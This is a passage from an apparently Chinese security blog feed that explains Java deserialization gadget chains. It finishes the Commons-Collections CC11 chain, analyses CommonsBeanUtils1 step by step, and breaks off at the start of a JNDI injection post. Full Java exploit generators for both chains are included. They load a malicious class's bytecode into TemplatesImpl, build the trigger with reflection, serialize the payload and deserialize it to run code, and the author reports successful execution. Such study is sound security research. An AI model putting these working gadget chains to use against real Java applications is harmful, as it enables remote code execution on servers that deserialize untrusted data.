alt="image-20240723234431270"></p><p>直接写出较短的那条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc11.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一个小问题就是关于这里最后为什么innermap里存在一个<code>&#123;&quot;n4c1&quot;: 1&#125;</code>键值对(因此我们需要 innermap.remove(“n4c1”);把它删掉)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;n4c1&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里我也不知道是怎么回事, 大概是TiedMapEntry触发了LazyMap的懒加载机制, 但是调试了很久也没有定位到</p><p>其他的细节问题在CC6中已经分析过了这里就不赘述了</p><p>那么CC11就算完成了</p><h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk8无限制, 我这里依然使用jdk8u65</p><p>其他依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>关于JavaBean可以参考廖雪峰老师官方网站</p><p><a href="https://liaoxuefeng.com/books/java/oop/core/javabean/">https://liaoxuefeng.com/books/java/oop/core/javabean/</a></p><p>实际上JavaBean就是对一个Java类的标准封装方法, 我们只需要使用它的getter和setter方法来操作其中的property, 而不需要关系其具体实现过程</p><p>在Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法</p><p>例如我们有一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就是一个JavaBean的写法</p><p>使用PropertyUtils.getProperty调用getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>), <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果: n4c1</span></span><br></pre></td></tr></table></figure><p>这会根据传入的参数自动找到对应的getter也就是getName方法</p><h3 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h3><p>所以我们为什么要说到getProperty这个方法呢?</p><p>回顾一下我们在使用恶意加载类时的TemplatesImpl这个类</p><p>进入这个类的第一跳是newTransformer方法, 如果再往前推一跳, 看谁调用了newTransformer方法,可以找到这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725144545883.png" alt="image-20240725144545883"></p><p>这个写法正是一个getter, 并且作用域为 public, 我们就可以使用PropertyUtils.getProperty来调用</p><p>那么这部分链子大概就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145217573.png" alt="image-20240725145217573"></p><p>接下来就是从getProperty方法把链子向反序列化入口readObject延申</p><p>谁调用了getProperty?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145938804.png" alt="image-20240725145938804"></p><p>在BeanComparator这个类中的compare方法中有两处调用</p><p>这个compare在其他类中使用的非常多, 我们需要找到一个可序列化的类来延申链子</p><p>这里我们找到之前使用过的一个类 PriorityQueue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150808043.png" alt="image-20240725150808043"></p><p>在siftDownUsingComparator方法中调用了compare</p><p>继续找siftDownUsingComparator的调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150928391.png" alt="image-20240725150928391"></p><p>在同一个类中, siftDown对其进行了调用</p><p>继续</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151033240.png" alt="image-20240725151033240"></p><p>在同一个类中heapify调用了siftDown</p><p>再进一步我们就会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151145897.png" alt="image-20240725151145897"></p><p>同一个类的readObject调用了heapify</p><p>实际上熟悉的师傅们都知道这其实就是CC4的前半链</p><p>串联起来大概是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725153027846.png" alt="image-20240725153027846"></p><p>接下来就是依照这个流程来手写exp了</p><p>首先我们确定从compare开始这条链子是通的</p><p>如图代码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725160518504.png" alt="image-20240725160518504"></p><p>由于add是会触发compare比较的(有兴趣的师傅可以调式看看), 所以反射赋值</p><p>还有outputProperties这个值也需要反射赋值进去, 不然会抛出错误导致序列化失败</p><p>所以最终应该是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = &#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">        queue.set(priorityQueue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> BeanComparator.class.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        property.set(beanComparator, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;CB1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CB1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注:</p><p>这里的PriorityQueue的queue属性虽然被transient修饰为不可序列化, 但是PriorityQueue自定义类writeObject方法来序列化queue中的内容</p></blockquote><p>我们只反序列化看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725171752965.png" alt="image-20240725171752965"></p><p>成功执行</p><h2 id="总结-完整流程图"><a href="#总结-完整流程图" class="headerlink" title="总结(完整流程图)"></a>总结(完整流程图)</h2><p>这两条链子的整个流程:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/CC11%20%26%20CommonsBeanUtils1.png" alt="CC11 &amp; CommonsBeanUtils1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;a href=&quot;#遗漏的CC11和CommonsBeanUtils链&quot; class=&quot;headerlink&quot; title=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;/a&gt;遗漏的CC11和Com</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入初探</title>
    <link href="http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</id>
    <published>2024-07-12T14:07:13.000Z</published>
    <updated>2024-09-05T12:32:52.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入初探"><a href="#JNDI注入初探" class="headerlink" title="JNDI注入初探"></a>JNDI注入初探</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p><p><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p><h2 id="JNDI-的利用方式"><a href="#JNDI-的利用方式" class="headerlink" title="JNDI 的利用方式"></a>JNDI 的利用方式</h2><h3 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h3><p>首先上服务端和客户端代码</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 